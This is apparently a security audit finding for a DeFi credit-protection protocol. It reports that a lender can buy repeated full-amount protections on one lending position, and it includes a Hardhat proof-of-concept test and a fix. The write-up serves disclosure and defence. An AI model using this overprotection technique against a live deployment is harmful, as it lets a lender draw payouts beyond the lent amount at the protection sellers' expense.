# a buyer of protection can overprotect their position

## Summary
ProtectionPool limits single protections to not be over the limit of the remaining principal for the position. But there's nothing stopping a lender to do multiple protections of the full amount for the same position as long as they stay within leverage limit.

## Vulnerability Detail
In `ReferenceLendingPools.sol` there's a check that the requested protection amount is not above the remaining principal for the position:
```solidity

159:    /// Verify that protection amount is less than or equal to the remaining principal
160:    /// that buyer has lent to the underlying lending pool
161:    return
162:      _purchaseParams.protectionAmount <=
163:      calculateRemainingPrincipal(
164:        _purchaseParams.lendingPoolAddress,
165:        _buyer,
166:        _purchaseParams.nftLpTokenId
167:      );
```
However, there's never a check that there are no previous protections against the same position. So a lender that knows that a loan is going to default can overprotect their position as much as they want, provided they stay within leverage limits.


PoC, insert at row 505 in `ProtectionPool.test.ts`
```javascript
        it("... can overprotect a position", async() => {
          const before = await network.provider.send("evm_snapshot", []);

          // full position
          const remainingPrincipal = await referenceLendingPools.calculateRemainingPrincipal(_lendingPool2,await _protectionBuyer1.getAddress(),590);

          await expect((await protectionPool.getActiveProtections(await _protectionBuyer1.getAddress())).length).to.be.eq(0);

          // make sure there are sellers of protection
          await transferAndApproveUsdcToPool(deployer, remainingPrincipal.mul(2));
          await protectionPool
            .connect(deployer)
            .deposit(remainingPrincipal.mul(2), deployerAddress);

          // move phase
          await expect(protectionPool.connect(deployer).movePoolPhase())
            .to.emit(protectionPool, "ProtectionPoolPhaseUpdated").withArgs(1);
          expect((await protectionPool.getPoolInfo()).currentPhase).to.eq(1);

          await USDC.connect(_protectionBuyer1).approve(protectionPool.address,parseUSDC("20000"));

          // buy first protection for full amount
          await protectionPool.connect(_protectionBuyer1).buyProtection(
            {
              lendingPoolAddress: _lendingPool2,
              nftLpTokenId: 590,
              protectionAmount: remainingPrincipal,
              protectionDurationInSeconds: getDaysInSeconds(30)
            },
            parseUSDC("10000")
          );

          // buy second protection, this can go on for as long as leverage is above min (and can pay principal)
          await protectionPool.connect(_protectionBuyer1).buyProtection(
            {
              lendingPoolAddress: _lendingPool2,
              nftLpTokenId: 590,
              protectionAmount: remainingPrincipal,
              protectionDurationInSeconds: getDaysInSeconds(30)
            },
            parseUSDC("10000")
          );

          // two protections
          await expect((await protectionPool.getActiveProtections(await _protectionBuyer1.getAddress())).length).to.be.eq(2);

          expect(await network.provider.send("evm_revert", [before])).to.be.eq(true);
        });
```

## Impact
If a lender have a hunch a loan is going to default they can overprotect their position so when the loan defaults they can get paid out more than they were lending out.

Manual Review, hardhat

## Recommendation
I recommend that you check that the requested protection amount is more than the remaining premium and also add previous active protections against the same position (`nftLpTokenId`)
